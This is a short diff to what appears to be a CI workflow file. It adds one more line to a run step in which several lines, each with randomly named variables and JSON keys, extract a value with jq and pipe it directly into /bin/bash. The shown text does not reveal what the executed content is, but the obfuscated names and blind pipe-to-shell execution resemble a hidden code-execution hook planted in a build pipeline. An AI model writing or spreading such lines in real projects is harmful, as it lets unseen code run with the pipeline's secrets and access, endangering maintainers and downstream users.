@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$jimgl14" | jq -r .ok2403 | /bin/bash
           echo $q8920 | jq -r .phvgs8065 | /bin/bash
           echo $bpfx3 | jq -r .i9 | /bin/bash
+          echo $usitd3 | jq -r .xnp8 | /bin/bash
 
       - name: Save archive
         if: always()
